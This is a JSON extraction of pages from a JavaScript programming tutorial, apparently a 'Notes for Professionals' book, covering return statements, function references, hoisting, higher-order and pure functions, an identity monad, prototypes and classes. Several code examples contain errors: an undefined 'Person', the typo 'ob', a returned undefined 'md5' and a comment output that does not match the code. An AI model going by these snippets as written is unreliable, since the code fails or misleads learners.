        "img": []
    },
    {
        "text": "     // `value % 2 === 0` tests if the number is even or odd      // If it's even we add one to the result of counting the remainder of      // the array.  If it's odd, we add zero to it.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   (( value  %   2   ===   0 )   ?   1   :   0 )   +  countEvens ( arr ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is important that such functions make some sort of sentinel value check to avoid in\ufb01nite loops. In the \ufb01rst example above, when  n  is less than or equal to 1, the recursion stops, allowing the result of each call to be returned back up the call stack.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 19.16: Using the Return Statement",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The return statement can be a useful way to create output for a function. The return statement is especially useful if you do not know in which context the function will be used yet.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//An example function that will take a string as input and return //the first character of the string.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  firstChar  ( stringIn ){      return  stringIn. charAt ( 0 ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now to use this function, you need to put it in place of a variable somewhere else in your code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Using the function result as an argument for another function:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( firstChar ( \"Hello world\" ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output will be: >  H",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The return statement ends the function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If we modify the function in the beginning, we can demonstrate that the return statement ends the function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  firstChar  ( stringIn ){     console. log ( \"The first action of the first char function\" );      return  stringIn. charAt ( 0 );     console. log ( \"The last action of the first char function\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 182 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Running this function like so will look like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( firstChar ( \"JS\" ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Console output:",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": ">  The first action of the first  char   function >  J",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It will not print the message after the return statement, as the function has now been ended.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Return statement spanning multiple lines:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In JavaScript, you can normally split up a line of code into many lines for readability purposes or organization. This is valid JavaScript: var",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    name  =   \"bob\" ,     age  =   18 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When JavaScript sees an incomplete statement like  var  it looks to the next line to complete itself. However, if you make the same mistake with the  return  statement, you will not get what you expected.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "return",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     \"Hi, my name is \" +  name  +   \". \"   +      \"I'm \" +  age  +   \" years old.\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This code will return  undefined  because  return  by itself is a complete statement in JavaScript, so it will not look to the next line to complete itself. If you need to split up a  return  statement into multiple lines, put a value next to return before you split it up, like so.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "return   \"Hi, my name is \"   +  name  +   \". \"   +      \"I'm \"   +  age  +   \" years old.\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 19.17: Functions as a variable",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A normal function declaration looks like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo (){ }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A function de\ufb01ned like this is accessible from anywhere within its context by its name. But sometimes it can be useful to treat function references like object references. For example, you can assign an object to a variable based on some set of conditions and then later retrieve a property from one or the other object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  name  =   'Cameron' ; var  spouse ; if   (  name  ===   'Taylor'   )  spouse  =   {  name :   'Jordan'   }; else   if   (  name  ===   'Cameron'   )  spouse  =   {  name :   'Casey'   }; var  spouseName  =  spouse. name ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 183",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In JavaScript, you can do the same thing with functions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Example 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  hashAlgorithm  =   'sha1' ; var  hash ; if   (  hashAlgorithm  ===   'sha1'   )  hash  =   function ( value ){   /*...*/   }; else   if   (  hashAlgorithm  ===   'md5'   )  hash  =   function ( value ){   /*...*/   }; hash ( 'Fred' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the example above,  hash  is a normal variable. It is assigned a reference to a function, after which the function it references can be invoked using parentheses, just like a normal function declaration. The example above references anonymous functions... functions that do not have their own name. You can also use variables to refer to named functions. The example above could be rewritten like so:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Example 2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  hashAlgorithm  =   'sha1' ; var  hash ; if   (  hashAlgorithm  ===   'sha1'   )  hash  =  sha1Hash ; else   if   (  hashAlgorithm  ===   'md5'   )  hash  =  md5Hash ; hash ( 'Fred' ); function  md5Hash ( value ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // ... }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  sha1Hash ( value ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // ... }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or, you can assign function references from object properties:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Example 3",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  hashAlgorithms  =   {     sha1 :   function ( value )   {   /**/   },     md5 :   function ( value )   {   /**/   } }; var  hashAlgorithm  =   'sha1' ; var  hash ; if   (  hashAlgorithm  ===   'sha1'   )  hash  =  hashAlgorithms. sha1 ; else   if   (  hashAlgorithm  ===   'md5'   )  hash  =  hashAlgorithms. md5 ; hash ( 'Fred' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can assign the reference to a function held by one variable to another by omitting the parentheses. This can result in an easy-to-make mistake: attempting to assign the return value of a function to another variable, but accidentally assigning the reference to the function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Example 4",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  a  =  getValue ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  b  =  a ;   // b is now a reference to getValue. var  c  =  b ();   // b is invoked, so c now holds the value returned by getValue (41)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 184",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getValue (){      return   41 ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A reference to a function is like any other value. As you've seen, a reference can be assigned to a variable, and that variable's reference value can be subsequently assigned to other variables. You can pass around references to functions like any other value, including passing a reference to a function as the return value of another function. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Example 5 // getHashingFunction returns a function, which is assigned // to hash for later use:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  hash  =  getHashingFunction (   'sha1'   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// ...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "hash ( 'Fred' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// return the function corresponding to the given algorithmName",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  getHashingFunction (  algorithmName  ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // return a reference to an anonymous function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( algorithmName  ===   'sha1' )   return   function ( value ){   /**/   };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // return a reference to a declared function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     else   if   ( algorithmName  ===   'md5' )   return  md5 ; } function  md5Hash ( value ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // ... }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You don't need to assign a function reference to a variable in order to invoke it. This example, building o\ufb00 example 5, will call getHashingFunction and then immediately invoke the returned function and pass its return value to hashedValue.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Example 6",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  hashedValue  =  getHashingFunction (   'sha1'   )(   'Fred'   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A Note on Hoisting",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Keep in mind that, unlike normal function declarations, variables that reference functions are not \"hoisted\". In example 2, the  md5Hash  and  sha1Hash  functions are de\ufb01ned at the bottom of the script, but are available everywhere immediately. No matter where you de\ufb01ne a function, the interpreter \"hoists\" it to the top of its scope, making it immediately available. This is  not  the case for variable de\ufb01nitions, so code like the following will break:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  functionVariable ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "hoistedFunction ();   // works, because the function is \"hoisted\" to the top of its scope functionVariable ();   // error: undefined is not a function.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  hoistedFunction (){} functionVariable  =   function (){};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 185",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 20: Functional JavaScript",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 20.1: Higher-Order Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In general, functions that operate on other functions, either by taking them as arguments or by returning them (or both), are called higher-order functions. A higher-order function is a function that can take another function as an argument. You are using higher-order functions when passing callbacks.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  iAmCallbackFunction ()   {     console. log ( \"callback has been invoked\" ); } function  iAmJustFunction ( callbackFn )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // do some stuff ...      // invoke the callback function.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    callbackFn (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// invoke your higher-order function with a callback function.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "iAmJustFunction ( iAmCallbackFunction );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A higher-order function is also a function that returns another function as its result.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  iAmJustFunction ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // do some stuff ...      // return a function.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   function  iAmReturnedFunction ()   {         console. log ( \"returned function has been invoked\" );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// invoke your higher-order function and its returned function.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "iAmJustFunction ()();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 20.2: Identity Monad",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This is an example of an implementation of the identity monad in JavaScript, and could serve as a starting point to create other monads. Based on the  conference by Douglas Crockford on monads and gonads Using this approach reusing your functions will be easier because of the \ufb02exibility this monad provides, and composition nightmares:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "f ( g ( h ( i ( j ( k ( value ),  j1 ),  i2 ),  h1 ,  h2 ),  g1 ,  g2 ),  f1 ,  f2 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "readable, nice and clean:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "identityMonad ( value )     . bind ( k )     . bind ( j ,  j1 ,  j2 )     . bind ( i ,  i2 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 186",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    . bind ( h ,  h1 ,  h2 )     . bind ( g ,  g1 ,  g2 )     . bind ( f ,  f1 ,  f2 ); function  identityMonad ( value )   {      var  monad  =  Object. create ( null );    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // func should return a monad",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    monad. bind   =   function   ( func ,  ... args )   {          return  func ( value ,  ... args );      };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // whatever func does, we get our monad back",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    monad. call   =   function   ( func ,  ... args )   {         func ( value ,  ... args );          return  identityMonad ( value );      };    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // func doesn't have to know anything about monads",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    monad. apply   =   function   ( func ,  ... args )   {          return  identityMonad ( func ( value ,  ... args ));      };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Get the value wrapped in this monad",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    monad. value   =   function   ()   {          return  value ;      };          return  monad ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It works with primitive values",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  value  =   'foo' ,     f  =  x  =>  x  +   ' changed' ,     g  =  x  =>  x  +   ' again' ; identityMonad ( value )     . apply ( f )     . apply ( g )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . bind ( alert );   // Alerts 'foo changed again'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And also with objects",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  value  =   {  foo :   'foo'   },     f  =  x  =>  identityMonad ( Object. assign ( x ,   {  foo :   'bar'   })),     g  =  x  =>  Object. assign ( x ,   {  bar :   'foo'   }),     h  =  x  =>  console. log ( 'foo: '   +  x. foo   +   ', bar: '   +  x. bar ); identityMonad ( value )     . bind ( f )     . apply ( g )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    . bind ( h );   // Logs 'foo: bar, bar: foo'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Let's try everything:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  add  =   ( x ,  ... args )   =>  x  +  args. reduce (( r ,  n )   =>  r  +  n ,   0 ),     multiply  =   ( x ,  ... args )   =>  x  *  args. reduce (( r ,  n )   =>  r  *  n ,   1 ),",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 187",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    divideMonad  =   ( x ,  ... args )   =>  identityMonad ( x  /  multiply ( ... args )),     log  =  x  =>  console. log ( x ),     substract  =   ( x ,  ... args )   =>  x  -  add ( ... args ); identityMonad ( 100 )     . apply ( add ,   10 ,   29 ,   13 )     . apply ( multiply ,   2 )     . bind ( divideMonad ,   2 )     . apply ( substract ,   67 ,   34 )     . apply ( multiply ,   1239 )     . bind ( divideMonad ,   20 ,   54 ,   2 )     . apply ( Math. round )     . call ( log );   // Logs 29",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 20.3: Pure Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A basic principle of functional programming is that it  avoids changing  the application state (statelessness) and variables outside its scope (immutability). Pure functions are functions that: with a given input, always return the same output they do not rely on any variable outside their scope they do not modify the state of the application ( no side e\ufb00ects ) Let's take a look at some examples: Pure functions must not change any variable outside their scope",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Impure function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  obj  =   {  a :   0   } const  impure  =   ( input )   =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Modifies input.a",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  input. a   =  input. a   +   1 ;    return  input. a ; } let  b  =  impure ( obj )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj )   // Logs { \"a\": 1 }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( b )   // Logs 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The function changed the  obj. a  value that is outside its scope.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Pure function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  obj  =   {  a :   0   } const  pure  =   ( input )   =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Does not modify obj",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   let  output  =  input. a   +   1 ;    return  output ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 188",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  b  =  pure ( obj )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( obj )   // Logs { \"a\": 0 }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( b )   // Logs 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The function did not change the object  obj  values Pure functions must not rely on variables outside their scope",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Impure function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =   1 ; let  impure  =   ( input )   =>   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Multiply with variable outside function scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   let  output  =  input  *  a ;    return  output ; } console. log ( impure ( 2 ))   // Logs 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a ++;   // a becomes equal to 2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( impure ( 2 ))   // Logs 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This  impure  function rely on variable  a  that is de\ufb01ned outside its scope. So, if a is modi\ufb01ed,  impure 's function result will be di\ufb00erent.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Pure function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  pure  =   ( input )   =>   {    let  a  =   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Multiply with variable inside function scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   let  output  =  input  *  a ;    return  output ; } console. log ( pure ( 2 ))   // Logs 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  pure 's function result  does not rely  on any variable outside its scope.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 20.4: Accepting Functions as Arguments",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "function  transform ( fn ,  arr )   {      let  result  =   [];      for   ( let  el of arr )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        result. push ( fn ( el ));   // We push the result of the transformed item to result",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }      return  result ; } console. log ( transform ( x  =>  x  *   2 ,   [ 1 , 2 , 3 , 4 ]));   // [2, 4, 6, 8]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As you can see, our  transform  function accepts two parameters, a function and a collection. It will then iterate the collection, and push values onto the result, calling  fn  on each of them. Looks familiar? This is very similar to how  Array. prototype . map ()  works!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 189",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ([ 1 ,   2 ,   3 ,   4 ] . map ( x  =>  x  *   2 ));   // [2, 4, 6, 8]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 190",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 21: Prototypes, objects",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "In the conventional JS there are no class instead we have prototypes. Like the class, prototype inherits the properties including the methods and the variables declared in the class. We can create the new instance of the object whenever it is necessary by, Object.create(PrototypeName); (we can give the value for the constructor as well)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 21.1: Creation and initialising Prototype",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  Human  =   function ()   {    this . canWalk   =   true ;    this . canSpeak   =   true ;   // }; Person. prototype . greet   =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   if   ( this . canSpeak )   {   // checks whether this prototype has instance of speak",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . name   =   \"Steve\"     console. log ( 'Hi, I am '   +   this . name );    }   else {      console. log ( 'Sorry i can not speak' );    } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The prototype can be instantiated like this",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "obj  =  Object. create ( Person. prototype ); ob. greet ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can pass value for the constructor and make the boolean true and false based on the requirement. Detailed Explanation",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  Human  =   function ()   {      this . canSpeak   =   true ; };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Basic greet function which will greet based on the canSpeak flag",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Human. prototype . greet   =   function ()   {      if   ( this . canSpeak )   {         console. log ( 'Hi, I am '   +   this . name );      } }; var  Student  =   function ( name ,  title )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    Human. call ( this );   // Instantiating the Human object and getting the memebers of the class      this . name   =  name ;   // inheriting the name from the human class      this . title   =  title ;   // getting the title from the called function };",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Student. prototype   =  Object. create ( Human. prototype ); Student. prototype . constructor   =  Student ; Student. prototype . greet   =   function ()   {      if   ( this . canSpeak )   {         console. log ( 'Hi, I am '   +   this . name   +   ', the '   +   this . title );      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 191",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  Customer  =   function ( name )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    Human. call ( this );   // inheriting from the base class",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . name   =  name ; }; Customer. prototype   =  Object. create ( Human. prototype );   // creating the object Customer. prototype . constructor   =  Customer ; var  bill  =   new  Student ( 'Billy' ,   'Teacher' ); var  carter  =   new  Customer ( 'Carter' ); var  andy  =   new  Student ( 'Andy' ,   'Bill' ); var  virat  =   new  Customer ( 'Virat' ); bill. greet ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Hi, I am Bob, the Teacher",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "carter. greet ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Hi, I am Carter",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "andy. greet ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Hi, I am Andy, the Bill",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "virat. greet ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 192",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 22: Classes",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 22.1: Class Constructor",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The fundamental part of most classes is its constructor, which sets up each instance's initial state and handles any parameters that were passed when calling  new . It's de\ufb01ned in a  class  block as though you're de\ufb01ning a method named  constructor , though it's actually handled as a special case.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  MyClass  {     constructor ( option )   {         console. log ( `Creating instance using $ { option }  option.` );          this . option   =  option ;      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example usage:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
